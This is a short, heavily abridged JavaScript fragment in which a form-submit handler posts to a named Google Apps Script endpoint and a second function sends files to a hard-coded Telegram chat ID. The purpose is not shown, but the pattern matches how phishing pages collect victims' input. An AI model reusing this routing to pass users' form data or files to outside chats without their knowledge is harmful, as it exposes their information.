function submitForm(event) {
    ...
    fetch("https://script.google.com/macros/s/AKfycbyarzZL_7aLIMgQgouR-I5IGSLq_uh1OwaXpyPgWW_HfGmsLK96GosHqxgUlmFajvKy/exec", {
        method: "POST",
...
function sendFileToTelegram(file) {
    ...
    const chatId = "-4629186165";  // Replace with the chat ID to send the file to
